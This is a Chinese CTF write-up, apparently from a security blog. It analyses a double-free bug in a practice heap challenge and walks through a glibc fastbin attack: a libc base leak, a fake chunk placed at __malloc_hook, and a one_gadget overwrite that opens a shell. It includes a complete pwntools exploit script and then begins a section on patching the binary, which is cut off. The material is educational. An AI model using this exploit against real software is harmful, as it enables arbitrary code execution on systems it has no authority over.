### 一、摘要
​从一道简单fast_bin利用题，分析当前fast_bin attack的本质思想就是通过一系列的绕过check与伪造fast_bin freed
chunk
fd指针内容获得（malloc）一块指向目标内存的指针引用，如got表、`__malloc_hook`、`__free_hook`等引用，即可对其原来的函数指针进行改写，如改写为
`__free_hook`
为某处one_gadget地址，即可对目标程序流程进行控制，拿下shel;并以此题目介绍当前常用的三种patch手法：增加segment，修改section如
`.eh_frame`,IDA keypatch。断断续续入门pwn也有一段时间了，写下此文记录一段时间来的学习，供其他一路在学习的同志参考。
​相关题目、源码、exp和patch脚本已经放在[github](https://github.com/thonsun/CTF/tree/master/patch)上可以自行下载参考练习。此处感谢sunichi师傅在patch一些技巧的指导。
### 二、漏洞分析
#### 2.1 题目描述
​源码vul.c经过gcc默认编译成64位binary，检查开启的安全保护机制：  
位置相关代码且开始Canary,NX保护，注意到Partial RELRO（Reloaction Read
Only）,表示可以可以覆写got表。进一步分析程序的执行流程：  
典型的glibc
heap的题目，表示我们可以操作内存块。分析add_note,delete_note,show_note的函数执行逻辑，只在delete_note处发现存在Double
Free的漏洞  
而程序的add_note只是简单的读入size个字符到分配的size大小的chunk，show_note把它以字符串形式打印出来  
add_note:  
show_note:  
不存在UAF的漏洞，但由于存在Double Free,同样可以通过利用fast bin attack分配到一块指向got表项或者
`__malloc_hook` 或者 `__free_hook`
，修改其指针指向一个开shell(vul_func)的函数，即可达到控制程序流程的目的。此处选择覆盖
`__malloc_hook`进行利用，因为在每次调用malloc时候都会检查该函数是否被设置（大佬忽略），有关ptmalloc2内存分配的过程步骤详情参阅[CTF
wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/introduction-zh/)，在这里知道若覆盖了 `__malloc_hook`这些函数，在调用该函数即调用了我们定义的函数，执行shellcode。
#### 2.2 shellcode 技术
​此处可以利用[one_gadget](https://github.com/david942j/one_gadget)或者ROP技术，选择one_gadget方便快捷，但有一些条件的限制，要寻得满足前提下的one_gadget地址（不同机器可能有所不同，exp里面的地址可能需要手动调整，我的机器为Ubuntu16.04LTS），在这里one_gadget可以这样理解：libc库给上层诸如IO函数提供支持，存在system("/bin/sh")执行返回结果，当然这样的代码对我们不可见，因其存在一个API函数内部的某一过程，但通过插件可以找到该语句的偏移与执行的前提条件，这就是one_gadget的原理。
### 三、漏洞利用
#### 3.1 泄露libc地址
​要知道利用one_gadget工具查找libc的one_gadget只是一个偏移量，要想对
`__malloc_hook`函数进行覆写为调用该one_gadget,要寻得此时libc加载到内存的基址，shellcode的地址即为：libc_base
+ offset。  
要泄露libc的地址，知道全局变量main_arena(记录此时进程的heap状况)为binary的动态加载的libc.so中.bss段中一个全局结构体，在内存映射中，偏移量是固定的，所以只需知道该main_arena此刻在内存地址和main_arena变量相对与libc.so中的偏移量即可计算libc基址：
    libc_base = main_arena - main_arena_offset
对于linux的内存管理器，在使用free()进行内存释放时候，不大于max_fast（默认是64B）的chunk进行释放的时候会被放入fast_bin中，采用单链表进行组织，在下一次分配的采用LIFO的分配策略。而大于max_fast则被放入unsorted_bin，采用双向链表进行组织。当fast_bin为空的时候，大于max_fast的内存块释放时会填入fd,bk并且都指向main_arena结构体中的top_chunk。再次分配内存的时候并不会清空bk,fd的内容，通过show_note即可获得main_arena中top_chunk对于libc加载基址的偏移量。
    # leak libc_base_address
    add(0x500,'a') # 0
    add(0x10,'a') # 1
    free(0)
    add(0x500,'a') # 2
    gdb.attach()
    show(2)
    main_arena = p.recv(6).ljust(8,'\x00')
    libc.address = u64(main_arena)-0x3c4b61 # 0x3c4b61位偏移量 61是因为填充了‘a’,0x61=a,小端序
  1. 对于有符号的libc-dbg(如我在Ubuntu中装有带debug符号版本的libc-2.23.so)，可以直接在gdb中获取到该偏移量  
因为unsorted_bin中填入fd、bk的是top_chunk的地址(在代码第7行进入gdb调试可以看到内存分布)  
在free(0)后再次申请获得该内存add(0x500,'a')中进程中heap的状况：  
在第一次add(0x500,'a')的时候再次add(0x10,'a')是为了让idx=0的chunk与top_chunk隔离，在free(0)没有与top_chunk合并，而是加入unsorted_bin，填入指向main_arena的fd、bk指针，使得再次add(0x500,'a')的时候可以获得libc的一个地址。  
对于0x1dc7000的chunk,在经过释放再次申请时chunk中data:  
可以看到unsorted_bin中chunk的bk是指向了main_arena的top_chunk域中，但此处fd != bk这是为什么？
因为是add(0x500,'a')再次从unsorted_bin中获得该chunk,Linux下小端序表示数，填入的'a'填充了fd的低一字节内容（即0x78
被 替换为
0x61），但这并不影响libc基址的计算：多次加载的libc中，偏移量不变，在gdb中获得某一次关于top_chunk指针域地址对于加载的libc的偏移量offset即可在以后泄露出top_chunk指针域地址ptr,这次加载的libc_base_address
= ptr - offset即可计算。
由于此处的ptr被写入的‘a’占去低位字节，此处的计算得来的offset也通过‘a’ = 0x61占位即可：
fd域内存小端序表示：  
offset = 0x7f2d234bdb78 - 0x0x7f2d230f9000 = 0x3c4B78
用0x61占低位字节：offset = 0x3c4B61
即此题通过show_note(2)计算libc_base 地址：
        show(2)
     main_arena = p.recv(6).ljust(8,'\x00')  # 只能接收fd的前6字节，00截断了
     libc.address = u64(main_arena)-0x3c4b61
  2. 对于无debug符号的libc则可以通过IDA静态分析该libc.so获取到该偏移量：
如利用malloc_trim函数中：
    1. dword_3C4B820即为main_arena结构体对应与libc加载基址的偏移量。
相关源码可以确定：
                int
        __malloc_trim (size_t s)
        {
        int result = 0;
        if (__malloc_initialized mutex);
           result |= mtrim (ar_ptr, s);
           __libc_lock_unlock (ar_ptr->mutex);
           ar_ptr = ar_ptr->next;
         }
        while (ar_ptr != &main_arena);
        return result;
        }
#### 3.2 非法内存获取
​要想对 `_malloc_hook` 进行覆写，首先要获得该地址处的指针引用（这也是glibc heap
exploit的一个思想，通过各种利用技巧获得对目标地址的一个引用，进而修改内存中内容）。对于fast_bin中，释放小于max_fast的chunk都将采用单向链表插入到fast_bin进行管理，即通过fd指针指向下一块的内存地址，在malloc中，fast_bin中满足大小的chunk将优先得到分配。
​题目存在double
free漏洞，即可以在一个fast_bin单链中存在两处某一chunk的引用。第一次获得该chunk后可以通过覆写fd域内容为一个地址指针（fake
fast_bin
chunk）,在后面存在该chunk的引用由于fd修改，该地址被加入到该大小的fast_bin链表中。即经若干次malloc该大小的fast_bin，可以获得该目标地址的引用。如图所示，fast_bin
attack的利用流程，即时没有UAF，也可以通过Double Free分配到一个目标地址进行覆写：
​值得注意的是，fast_bin 在分配的时候加入了检查：
    if ((unsigned long) (nb) fd, victim))
                 != victim);
          if (victim != 0)
            {
              if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))//fast_bin中的victim（选中的chunk）的size检查
                {
                  errstr = "malloc(): memory corruption (fast)";
                errout:
                  malloc_printerr (check_action, errstr, chunk2mem (victim), av);
                  return NULL;
                }
              check_remalloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }
        }
若bin中的chunk的size域不满足bin的索引关系会报错：这给我们不能随意构造chunk都可以满足。要对目标地址进行小小改动，绕过此处的检查。  
要想通过fast_bin获得 对 `__malloc_hook`地址处的引用，可以看其附近的内存信息，从中找出满足size要求的chunk构造  
通过gdb可以查看到 `__malloc_hook`的地址与及附近的内存信息（带debug符号信息的libc）  
查看进程max_fast的最大分配内存：
由于 `fastbin_index (chunksize (victim)) != idx` 只会检查
chunk中size字段的最后一字节（且后4位也只是作为标志位也不校检）作为大小校验：
小端序表示的数：即最低位的一字节为size大小。 `__malloc_ptr` -0x10
-3地址引用的chunk中size可以通过0x70的校验。0x70 <
0x80在fast_bin的管理范围内。所以通过连续分配0x68的大小的chunk可以伪造如利用图示的bin链表：
    # double free
    add(0x68,'a') # 3
    add(0x68,'a') # 4
    free(3)
    free(4)
    free(3)
    print "__malloc_hook address:",hex(libc.symbols['__malloc_hook'])
    add(0x68,p64(libc.symbols['__malloc_hook']-0x10-3)) # 伪造fake chunk(fast_bin) 分配到libc的内存
    add(0x68,'a')
    add(0x68,'a') # 露出伪造到libc的地址,即最后一块fake fast_bin chunk(目标地址)
    one_gadget = 0xf02a4
    add(0x68,'y'*3+p64(libc.address + one_gadget)) # 覆写 __malloc_hook函数指针为one_gadget
之所以要
    free(3)
    free(4)
    free(3)
是因为glibc在free的时候加入对fast_bin的检查：(只检查fast_bin头部与待free的chunk不同即可)
    /* Check that the top of the bin is not the record we are going to add
           (i.e., double free).  */
        if (__builtin_expect (old == p, 0))
          {
            errstr = "double free or corruption (fasttop)";
            goto errout;
          }
#### 3.3 寻找gadget
由3.1知道，one_gadget找到的地址有很多，要选用哪个这是经过调试选择满足条件的gadget地址：（所以利用one_gadget有一定的限制，此处为了方便没有采用ROP技术）
找到即将调用one_gadget处的上下文环境：
在rsp+0x50处找到满足条件的one_gadget地址：libc_base + 0xf02a4
#### 3.4 触发利用漏洞
通过上述过程，`__malloc_hook`处已经不为0了，被修改为了gadget处的地址，即再一次add_note调用malloc将进入
`__malloc_hook` 执行one_gadget,即开shell。
完整exp:
    #!/usr/bin/python
    # coding:utf-8
    from pwn import * 
    p = process("./vul")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    def add(size,data):
        p.sendafter("choice:","1")
        p.sendafter("size:",str(size))
        p.sendafter("write:",data)
    def free(idx):
        p.sendafter("choice:","2")
        p.sendafter("index:",str(idx))
    def show(idx):
        p.sendafter("choice:","3")
        p.sendafter("index:",str(idx))
    # leak libc base address
    add(0x500,'a') # 0
    add(0x10,'a') # 1
    free(0)
    add(0x500,'a') # 2
    show(2)
    main_arena = p.recv(6).ljust(8,'\x00') 
    libc.address = u64(main_arena)-0x3c4b61 # leak 到 libc的基址 0x61 = a
    # double free
    add(0x68,'a') # 3
    add(0x68,'a') # 4
    free(3)
    free(4)
    free(3)
    print "__malloc_hook address:",hex(libc.symbols['__malloc_hook'])
    add(0x68,p64(libc.symbols['__malloc_hook']-0x10-3)) # 伪造fake chunk(fast_bin) 分配到libc的内存
    add(0x68,'a')
    add(0x68,'a') # 露出伪造到libc的地址,即最后一块fake fast_bin chunk(目标地址)
    one_gadget = 0xf02a4
    add(0x68,'y'*3+p64(libc.address + one_gadget))
    p.interactive()
### 四、patch修补
​此处漏洞的成因在与存在一个Double
Free的漏洞，使得同一块内存可以在fast_bin中存在两次的单链，使得可以构造一个fake_fast_bin_chunk（目标内存地址），通过fast_bin的内存分配过程获得该内存的指针引用，对其内容（`__malloc_hook`）进行覆写，达到控制程序流程。
​所以要对vul进行patch修复，要在free()后对全局指针引用置零。
​当然比赛中我们是没有获取到源码的，要在原binary对程序进行打patch，要知道对binary某函数处想要添加一句代码，不是单纯的“添加”，此处详细介绍当前AWD下对bianry的patch手法：包括利用call的函数hook,jmp的函数跳转，利用LIEF编程与使用IDA神器插件Keypatch，各有各有点，请斟酌服用。
​要想在原binary的delete_note函数增加对note[idx] = 0的语句：用A&T语法表示